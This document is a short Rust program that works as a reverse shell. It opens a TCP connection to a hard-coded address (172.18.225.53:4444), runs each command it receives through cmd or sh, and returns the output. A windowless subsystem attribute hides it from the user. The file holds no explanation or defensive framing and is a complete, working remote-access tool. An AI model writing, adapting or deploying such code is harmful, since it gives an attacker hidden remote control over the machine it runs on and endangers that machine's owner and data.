#![windows_subsystem = "windows"]

use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() {
    if let Ok(mut stream) = TcpStream::connect("172.18.225.53:4444") {
        loop {
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(n) if n == 0 => break, // Connection closed
                Ok(n) => {
                    let command = String::from_utf8_lossy(&buffer[..n]);
                    let output = if cfg!(target_os = "windows") {
                        Command::new("cmd")
                            .arg("/C")
                            .arg(command.trim())
                            .stdout(Stdio::piped())
                            .output()
                    } else {
                        Command::new("sh")
                            .arg("-c")
                            .arg(command.trim())
                            .stdout(Stdio::piped())
                            .output()
                    };

                    if let Ok(output) = output {
                        let _ = stream.write_all(&output.stdout);
                    }
                }
                Err(_) => break,
            }
        }
    }
}
